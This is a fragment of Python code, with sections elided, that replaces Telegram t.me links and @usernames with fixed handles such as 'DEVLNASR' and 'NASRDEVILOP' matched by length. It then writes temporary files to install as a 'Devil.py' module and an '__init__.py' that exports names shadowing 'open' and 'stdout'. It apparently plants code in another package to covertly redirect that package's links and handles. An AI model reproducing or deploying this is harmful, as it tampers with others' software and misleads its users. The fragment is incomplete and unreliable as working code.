...
def open(text):
    if "https://t.me/" in text or text.split()[0]:
        ...
        replaced_url = (
            ...
            "DEVLNASR" if len(url) == 8 else
            "DEMONASRH" if len(url) == 9 else
            "DEMONASRVP" if len(url) == 10 else
            "NASRDEVILOP" if len(url) == 11 else
            "DEVLNASR12PO" if len(url) == 12 else
            "DEVLNASRVPVP1" if len(url) == 13 else
            "BWEJM"
        )
...
def replace_usernames_in_text(text):
    def replace_username(username):
        length = len(username)
        return (
            "BWEJM" if length == 5 else
            "NASRDS" if length == 6 else
            "NasrDVE" if length == 7 else
            "DEVLNASR" if length == 8 else
            "DEMONASRH" if length == 9 else
            "DEMONASRVP" if length == 10 else
            "NASRDEVILOP" if length == 11 else
            "DEVLNASR12PO" if length == 12 else
            "DEVLNASRVPVP1" if length == 13 else
            username
        )
    return re.sub(r'@(\w+)(\.\w+)?',
...
with tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f1, tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f2:
    f1.write(ka)
    f2.write("from .Devil import list, open, stduot, stdout")
    files_to_move = [(f1.name, "Devil.py"), (f2.name, "__init__.py")]
def ke(destination):
